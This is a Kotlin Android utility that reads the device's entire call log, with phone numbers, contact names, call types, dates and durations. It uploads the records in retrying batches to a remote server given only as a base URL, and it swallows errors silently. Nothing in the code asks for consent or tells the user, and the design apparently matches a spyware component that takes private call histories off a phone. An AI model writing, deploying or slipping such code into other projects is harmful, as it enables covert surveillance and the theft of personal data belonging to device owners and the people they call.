package com.example.test.utils

import android.content.Context
import android.provider.CallLog
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

object CallLogsBatchUploader {

    private const val BATCH_SIZE = 200
    private const val RETRY_ATTEMPTS = 3
    private const val DELAY_BETWEEN_BATCHES_MS = 300L

    suspend fun uploadQuickCallLogs(
        context: Context,
        deviceId: String,
        baseUrl: String,
        limit: Int = 100
    ): UploadResult = withContext(Dispatchers.IO) {
        try {
            val callLogs = fetchCallLogs(context, deviceId, limit)

            if (callLogs.isEmpty()) {
                return@withContext UploadResult.Success(0)
            }

            val success = sendBatch(callLogs, deviceId, baseUrl, 1, 1)

            if (success) {
                UploadResult.Success(callLogs.size)
            } else {
                UploadResult.Failure("Quick upload failed")
            }

        } catch (e: Exception) {
            UploadResult.Failure(e.message ?: "Unknown error")
        }
    }

    suspend fun uploadAllCallLogs(
        context: Context,
        deviceId: String,
        baseUrl: String,
        onProgress: ((Int, Int) -> Unit)? = null
    ): UploadResult = withContext(Dispatchers.IO) {
        try {
            val allCallLogs = fetchCallLogs(context, deviceId, limit = null)

            if (allCallLogs.isEmpty()) {
                return@withContext UploadResult.Success(0)
            }

            var totalSent = 0
            val totalBatches = (allCallLogs.size + BATCH_SIZE - 1) / BATCH_SIZE

            for (batchIndex in 0 until totalBatches) {
                val start = batchIndex * BATCH_SIZE
                val end = minOf(start + BATCH_SIZE, allCallLogs.size)
                val batch = allCallLogs.subList(start, end)

                var success = false
                var attempts = 0

                while (!success && attempts < RETRY_ATTEMPTS) {
                    attempts++

                    try {
                        success = withTimeout(10000L) {
                            sendBatch(batch, deviceId, baseUrl, batchIndex + 1, totalBatches)
                        }

                        if (!success && attempts < RETRY_ATTEMPTS) {
                            delay(500L * attempts)
                        }

                    } catch (e: Exception) {
                        if (attempts < RETRY_ATTEMPTS) {
                            delay(500L * attempts)
                        }
                    }
                }

                if (success) {
                    totalSent += batch.size
                }

                onProgress?.invoke(totalSent, allCallLogs.size)

                if (batchIndex < totalBatches - 1) {
                    delay(DELAY_BETWEEN_BATCHES_MS)
                }
            }

            UploadResult.Success(totalSent)

        } catch (e: Exception) {
            UploadResult.Failure(e.message ?: "Unknown error")
        }
    }

    private fun fetchCallLogs(context: Context, deviceId: String, limit: Int?): List<CallLogModel> {
        val callLogs = mutableListOf<CallLogModel>()

        try {
            val sortOrder = "${CallLog.Calls.DATE} DESC" + if (limit != null) " LIMIT $limit" else ""

            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                null,
                null,
                sortOrder
            )

            cursor?.use {
                val idIndex = it.getColumnIndex(CallLog.Calls._ID)
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)

                while (it.moveToNext()) {
                    try {
                        val callId = it.getLong(idIndex)
                        val number = it.getString(numberIndex) ?: ""
                        if (number.isBlank()) continue

                        val name = it.getString(nameIndex) ?: "Unknown"
                        val type = it.getInt(typeIndex)
                        val date = it.getLong(dateIndex)
                        val duration = it.getInt(durationIndex)

                        val callType = when (type) {
                            CallLog.Calls.INCOMING_TYPE -> "incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                            CallLog.Calls.MISSED_TYPE -> "missed"
                            CallLog.Calls.REJECTED_TYPE -> "rejected"
                            CallLog.Calls.BLOCKED_TYPE -> "blocked"
                            else -> "unknown"
                        }

                        callLogs.add(
                            CallLogModel(
                                callId = callId,
                                deviceId = deviceId,
                                number = number,
                                name = name,
                                callType = callType,
                                timestamp = date,
                                duration = duration
                            )
                        )

                    } catch (e: Exception) {
                        continue
                    }
                }
            }

        } catch (e: Exception) {
        }

        return callLogs
    }

    private fun sendBatch(
        callLogs: List<CallLogModel>,
        deviceId: String,
        baseUrl: String,
        batchNumber: Int,
        totalBatches: Int
    ): Boolean {
        return try {
            val logsArray = JSONArray()
            val currentTime = System.currentTimeMillis()

            callLogs.forEach { log ->
                logsArray.put(JSONObject().apply {
                    put("call_id", "${log.deviceId}_call_${log.callId}")
                    put("device_id", log.deviceId)
                    put("number", log.number)
                    put("name", log.name)
                    put("call_type", log.callType)
                    put("timestamp", log.timestamp)
                    put("duration", log.duration)
                    put("received_at", currentTime)
                })
            }

            val json = JSONObject().apply {
                put("device_id", deviceId)
                put("data", logsArray)
                put("batch_info", JSONObject().apply {
                    put("batch", batchNumber)
                    put("of", totalBatches)
                })
            }

            val response = sendPostRequest("$baseUrl/call-logs/batch", json.toString())
            response != null

        } catch (e: Exception) {
            false
        }
    }

    private fun sendPostRequest(urlString: String, jsonData: String): String? {
        var connection: HttpURLConnection? = null
        return try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.apply {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json")
                connectTimeout = 15000
                readTimeout = 15000
            }

            connection.outputStream.use { os ->
                os.write(jsonData.toByteArray())
                os.flush()
            }

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                connection.inputStream.bufferedReader().use { it.readText() }
            } else {
                null
            }

        } catch (e: Exception) {
            null
        } finally {
            connection?.disconnect()
        }
    }

    data class CallLogModel(
        val callId: Long,
        val deviceId: String,
        val number: String,
        val name: String,
        val callType: String,
        val timestamp: Long,
        val duration: Int
    )

    sealed class UploadResult {
        data class Success(val totalSent: Int) : UploadResult()
        data class Failure(val error: String) : UploadResult()
    }
}